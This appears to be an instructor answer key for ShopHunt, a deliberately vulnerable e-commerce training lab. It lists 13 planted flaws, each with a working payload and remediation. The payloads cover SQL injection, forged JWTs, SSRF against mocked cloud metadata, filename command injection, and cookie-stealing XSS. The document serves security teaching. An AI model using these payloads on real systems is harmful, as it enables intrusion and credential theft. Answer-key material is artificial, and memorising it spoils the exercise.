# ShopHunt — Vulnerability Map (Instructor Answer Key)

> ⚠️ **Instructor-only.** Keep this away from students until the debrief. It maps
> each real business feature to the bug it hides, with a working payload and a
> professional-format write-up for the "report preparation" lesson.

The same content is served live in **instructor mode** (OFF by default):
set `INSTRUCTOR_MODE=on`, then browse
`/api/instructor/<INSTRUCTOR_PATH_TOKEN>/map` and `/captures`.

## Status

| # | Vulnerability | Hidden inside feature | Primary endpoint(s) | Status |
|---|---------------|----------------------|---------------------|--------|
| 1 | SQL injection (error/blind/UNION) | Login, product search | `POST /api/auth/login`, `GET /api/products?search=&order=`, `POST /api/v1/auth/login` | ✅ |
| 2 | IDOR | Order history, profiles | `GET /api/orders/:id`, `GET /api/users/:id`, `GET /api/v1/users/:id` | ✅ |
| 3 | Broken access control | Seller/admin APIs | `/api/seller/*`, `/api/admin/*` | ✅ |
| 4 | JWT flaws (alg:none, weak secret, no expiry) | Auth | all bearer/cookie auth | ✅ |
| 5 | Mass assignment (role escalation) | Update profile | `PATCH /api/users/me` | ✅ |
| 6 | Business logic (stacking, negative qty, client price) | Cart/checkout | `POST /api/cart/items`, `POST /api/orders/checkout` | ✅ |
| 7 | **SSRF → mock IMDS (flagship)** | Import avatar from URL | `POST /api/uploads/avatar/import`, `POST /api/v1/integrations/cloud-sync` | ✅ |
| 8 | Unrestricted upload → RCE; SVG → stored XSS | Avatar upload | `POST /api/uploads/avatar` | ✅ |
| 9 | Stored XSS | Product reviews | `POST /api/products/:id/reviews` | ✅ |
| 10 | Blind XSS | Support ticket → admin panel | `POST /api/tickets` (+ admin viewer bot, `/api/v1/collect`) | ✅ |
| 11 | CSRF | Change email | `POST /api/users/me/email` | ✅ |
| 12 | Missing rate limit | Login, reset OTP | `POST /api/auth/login`, `POST /api/auth/reset-password` | ✅ |
| 13 | Info disclosure (stack traces, /.git, source maps, JS secret) | Errors + static hosting | verbose 500s, `/.git/`, `*.map`, JS bundle, `robots.txt`/`sitemap.xml` | ✅ |

---

## 1. SQL Injection — login & product search — **Critical**
- **Where:** `backend/src/routes/auth.js` (email concatenated), `routes/products.js` (`search`/`order` concatenated), `routes/v1.js` (auth bypass).
- **Payloads:**
  - v1 auth bypass: `email = admin@shophunt.local' -- ` (no password needed).
  - UNION extract: `?search=' UNION SELECT 1,email,password_hash,4,5,6,7,8,name FROM users-- -`
  - Time-blind: `?search=' AND (SELECT SLEEP(5))-- -`
  - ORDER BY inject (hidden param): `?order=(SELECT CASE WHEN(1=1) THEN p.id ELSE p.title END)`
- **Impact:** auth bypass, full DB read (hashes/PII), stacked-query writes.
- **Remediation:** parameterized queries; least-priv DB user; disable multi-statements; generic errors.

## 2. IDOR — orders & users — **High**
- **Where:** `routes/orders.js` (ownership check removed), `routes/users.js` `GET /:id`, `routes/v1.js` (adds password hash).
- **Payload:** authenticate, then `GET /api/orders/2`, `GET /api/users/1`.
- **Impact:** other customers' orders, shipping PII, emails, password hashes.
- **Remediation:** object-level authorization scoped to the caller.

## 3. Broken access control — seller/admin — **High**
- **Where:** `routes/sellers.js` and `routes/admin.js` (role checks removed; only `requireAuth`).
- **Payload:** with a normal customer JWT: `GET /api/admin/users`, `GET /api/admin/tickets`.
- **Impact:** list all users/tickets, reset lab, manage products.
- **Remediation:** enforce role server-side on every privileged route (deny by default).

## 4. JWT flaws — **Critical**
- **Where:** `backend/src/auth.js` (`verifyInsecure`).
- **Payloads:** `alg:none` unsigned token with `{"role":"admin"}`; or forge & sign with the weak secret `secret`; tokens never expire.
- **Impact:** role/account forgery → admin takeover.
- **Remediation:** pin algorithms (no none); strong secret; verify `exp`.

## 5. Mass assignment — **Critical**
- **Where:** `routes/users.js` `PATCH /me` (accepts `role`/`email`).
- **Payload:** `PATCH /api/users/me {"role":"admin"}`.
- **Impact:** self-promotion to admin.
- **Remediation:** strict allowlist; never bind bodies to privileged columns.

## 6. Business logic — cart/checkout — **High**
- **Where:** `routes/cart.js` (negative qty), `routes/orders.js` checkout (stacking + client price).
- **Payloads:** cart `quantity:-5`; checkout `{"coupon_codes":["WELCOME10","VIP20","SAVE5"]}`; checkout `{"items":[{"product_id":1,"quantity":1,"unit_price_cents":1}]}`.
- **Impact:** orders at/below $0.
- **Remediation:** validate qty>0; recompute prices server-side; one coupon; floor at 0.

## 7. SSRF → mock IMDS (FLAGSHIP) — **Critical**
- **Where:** `routes/uploads.js` `avatar/import` (no allowlist; non-image body echoed), impact via `routes/v1.js` `integrations/cloud-sync`.
- **Payloads:**
  - `POST /api/uploads/avatar/import {"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/shophunt-app-instance-role"}` → fake IAM creds in the error `preview`.
  - `POST /api/v1/integrations/cloud-sync {"access_key":"AKIAI44QH8DHBLABFAKE"}` → fake S3 backup listing (impact).
- **Impact:** steal instance credentials → cloud access (demonstrated against the mock).
- **Safety:** fully mocked; internal-only docker nets + a code pin route link-local targets to the mock, so a **real** `169.254.169.254` is never reachable.
- **Remediation:** scheme/host allowlist; block private/link-local/loopback/metadata; re-check after redirects; pin resolved IP (anti-rebind); IMDSv2 + hop limit 1; drop ambient role.

## 8. Unrestricted upload → RCE; SVG → stored XSS — **Critical**
- **Where:** `routes/uploads.js` `avatar` (no type filter; original filename; shell over path).
- **Payloads:** filename `x.png; id; .png` → command injection (output in `analysis`); upload `evil.svg` with `<svg onload=alert(document.domain)>` then open `/uploads/<name>`.
- **Impact:** RCE in backend container; stored XSS.
- **Safety:** RCE confined to the backend container on an internal-only network.
- **Remediation:** validate content-type + magic bytes; random names; serve safe type / `Content-Disposition`; never shell filenames.

## 9. Stored XSS — reviews — **High**
- **Where:** `frontend/src/pages/Product.jsx` (`dangerouslySetInnerHTML`).
- **Payload:** review body `<img src=x onerror=alert(document.cookie)>`.
- **Remediation:** encode/sanitize on render; CSP.

## 10. Blind XSS — support ticket → admin — **High**
- **Where:** `frontend/src/pages/Admin.jsx` renders ticket body raw; `backend/src/botAdmin.js` simulates an admin opening tickets every ~15s and beacons the admin cookie to `GET /api/v1/collect`.
- **Payload:** ticket body `<img src=x onerror="new Image().src='http://backend:4000/api/v1/collect?c='+document.cookie">`.
- **Verify:** captures at `/api/instructor/<token>/captures`.
- **Impact:** admin cookie theft → takeover.
- **Remediation:** encode/sanitize in admin views; CSP; HttpOnly cookies.

## 11. CSRF — change email — **Medium**
- **Where:** `routes/users.js` `POST /me/email` (cookie auth, no token/Origin check, permissive CORS, non-HttpOnly cookie).
- **Payload:** cross-site auto-submitting form / credentialed fetch to the endpoint.
- **Impact:** forced email change → account takeover via reset.
- **Remediation:** CSRF tokens / SameSite=strict; verify Origin; avoid ambient-cookie auth.

## 12. Missing rate limit — **Medium**
- **Where:** `routes/auth.js` (no throttle on login / reset).
- **Payload:** brute-force 6-digit OTP or credential-stuff login.
- **Remediation:** rate limit + lockout/backoff; CAPTCHA; longer/expiring OTPs.

## 13. Info disclosure / recon — **Medium**
- **Where:** verbose error handler (`app.js`), `/.git/` (nginx alias to shipped snapshot; secret in git *history*), source maps (`vite.config.js`), hardcoded key in bundle (`frontend/src/api.js`), `robots.txt`/`sitemap.xml`.
- **Payloads:** `git-dumper http://localhost:5173/.git/ out/` then read `config/secrets.yml` from history; grep bundle/`.map` for `sh_live_`/`shophunt_internal_`.
- **Remediation:** generic errors; never ship `.git`/source maps/secrets; secret management; security headers.

---

_Answer key complete for all 13 findings. Extend with the pattern in
`docs/adding-a-vulnerability.md`._
